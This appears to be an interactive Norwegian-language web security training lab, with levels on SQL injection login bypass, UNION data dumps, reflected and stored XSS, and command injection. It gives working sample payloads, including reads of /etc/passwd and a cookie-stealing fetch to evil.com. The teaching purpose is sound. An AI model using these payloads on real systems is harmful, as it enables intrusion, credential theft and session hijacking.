01HTML & CSS — slik er nettsider bygget
Lett▶
Nivå 1 — HTML & CSS
📄 Hva er HTML?

HTML (HyperText Markup Language) er språket alle nettsider er bygget med. Det definerer strukturen — hva som er en overskrift, en knapp, et inputfelt, en lenke.

🎨 Hva er CSS?

CSS styrer utseendet — farger, skriftstørrelser, layout og animasjoner. HTML = skjellettet, CSS = klærne.

2
Legg til et <input>-felt og en <button>
3

03Injection — hva er det og hvorfor er det farlig?
Lett▶
Nivå 3 — Injection intro
💉 Hva er injection?

Injection skjer når en angriper sender inn kode der applikasjonen forventer data. Det er som å skrive en kommando i et skjema — og systemet kjører den blindt.

⚠️ Hvorfor er det #1 på OWASP Top 10?

Enkelt å utnytte, og konsekvensene er katastrofale — full tilgang til database, serverfiler eller operativsystemet.

04SQL Injection — login bypass
Middels▶
Nivå 4 — Login bypass
🗄️ Hvordan SQL fungerer

Når du logger inn kjøres en SQL-spørring mot databasen. Problemet oppstår når brukerinput settes inn direkte uten å renses.

SELECT * FROM users WHERE username='[input]' AND password='[input]'
Mål
1
Prøv å logge inn med brukernavn admin og feil passord
2
Prøv payloaden ' OR '1'='1' -- som brukernavn
3
Se SQL-spørringen i sanntid og forstå hvorfor det virker
4
Hva gjør -- på slutten?
-- er en SQL-kommentar. Alt etter ignoreres — passord-sjekken nullstilles.
' OR '1'='1' -- gjør betingelsen alltid sann → innlogget.

05SQL Injection — dump data med UNION
Middels▶
Nivå 5 — UNION attack
🔗 UNION i SQL

UNION kombinerer resultater fra to SQL-spørringer. En angriper kan hente data fra andre tabeller — som brukertabellen med alle passord.

SELECT name FROM products WHERE id='1' UNION SELECT username, password FROM users --
Mål
1
Søk normalt med ID 1, 2, 3
2
Injiser: 1' UNION SELECT username, password FROM users --
3
Se alle brukere og passord i søkeresultatet
1' UNION SELECT username, password FROM users --
Konfidensialitet brytes.

07XSS — Reflected
Vanskelig▶
Nivå 7 — Reflected XSS
🪞 Hva er XSS?

XSS er injection av JavaScript i en nettside. I stedet for databasen, angripes nettleseren til andre brukere. Reflected XSS: payloaden reflekteres tilbake fra URL-en.

Mål
1
Søk normalt — se at søkeordet reflekteres
2
Søk med <b>fett</b>
3
Injiser <img src=x onerror="document.getElementById('xss-c').style.display='block'">
En angriper bruker: onerror="fetch('evil.com?c='+document.cookie)" — session hijacking.

08XSS — Stored (lagret injeksjon)
Vanskelig▶
Nivå 8 — Stored XSS
💾 Stored vs Reflected

Stored XSS lagrer payloaden i databasen og kjører den for alle som besøker siden. Mye farligere enn reflected XSS.

Mål
1
Legg igjen en normal kommentar
2
Legg igjen <img src=x onerror="this.closest('.ts-comment').style.border='3px solid red'">
3
Klikk "Simuler ny besøkende" — kjøres payloaden automatisk?
Stored er farligere: offeret trenger ikke klikke en spesiell lenke.

10Command Injection — kontroll over serveren
Vanskelig▶
Nivå 10 — Command Injection
💻 Hva er Command Injection?

Brukerinput sendes direkte til OS som en kommando. Et ping-verktøy kan misbrukes til å kjøre hvilken som helst OS-kommando.

ping 8.8.8.8; cat /etc/passwd
Mål
1
Ping en normal IP
2
Injiser 8.8.8.8; whoami
3
Prøv 8.8.8.8; cat /etc/passwd
CMDi gir tilgang til hele OS — ikke bare databasen. Du kan installere malware eller starte en reverse shell.
